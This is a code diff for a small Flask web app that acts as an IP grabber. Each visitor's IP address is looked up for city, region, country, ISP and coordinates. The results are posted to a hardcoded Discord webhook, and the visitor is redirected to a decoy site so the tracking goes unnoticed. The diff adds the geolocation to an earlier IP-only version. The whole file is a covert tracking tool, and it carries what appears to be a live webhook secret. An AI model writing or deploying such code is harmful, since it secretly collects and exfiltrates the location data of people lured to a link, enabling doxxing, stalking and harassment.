@@ -1,14 +1,35 @@
+
 from flask import Flask, request, redirect
 import requests
 
 app = Flask(__name__)
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1376119689129889812/RPSuEOVlaIu7BXd0W6eXDqPlOumgCT3DLFiFwl-AfmGGwq6xD7hAMDHUIoI3mVlKT26t'
+WEBHOOK_URL = "https://discord.com/api/webhooks/1376119689129889812/RPSuEOVlaIu7BXd0W6eXDqPlOumgCT3DLFiFwl-AfmGGwq6xD7hAMDHUIoI3mVlKT26t"  # replace with yours
 
-@app.route('/')
-def capture_ip():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    requests.post(WEBHOOK_URL, json={"content": f"Visitor IP: {ip}"})
-    return redirect("https://bigrat.monster")  # Optional redirect
+@app.route("/")
+def index():
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    geo_req = requests.get(f"https://ipapi.co/{user_ip}/json/")
 
-app.run(host='0.0.0.0', port=8080)
+    if geo_req.status_code == 200:
+        geo_data = geo_req.json()
+        message = (
+            f"**New Visit**\n"
+            f"IP: {user_ip}\n"
+            f"City: {geo_data.get('city')}\n"
+            f"Region: {geo_data.get('region')}\n"
+            f"Country: {geo_data.get('country_name')}\n"
+            f"Org: {geo_data.get('org')}\n"
+            f"Lat/Lon: {geo_data.get('latitude')}, {geo_data.get('longitude')}"
+        )
+    else:
+        message = f"IP: {user_ip}\nCould not retrieve location data."
+
+    # Send to Discord webhook
+    requests.post(WEBHOOK_URL, json={"content": message})
+
+    # Redirect to somewhere harmless
+    return redirect("https://bigrat.monster")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
